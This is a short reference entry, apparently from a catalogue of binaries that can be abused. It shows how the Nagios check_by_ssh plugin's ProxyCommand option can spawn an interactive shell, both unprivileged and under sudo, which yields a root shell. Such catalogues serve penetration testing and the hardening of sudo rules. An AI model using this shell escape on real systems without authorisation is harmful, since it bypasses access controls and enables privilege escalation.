check_by_ssh
============

Shell
-----

[Sudo]
    check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
    The shell will only last 10 seconds.

[Unprivileged]
    check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
    The shell will only last 10 seconds.
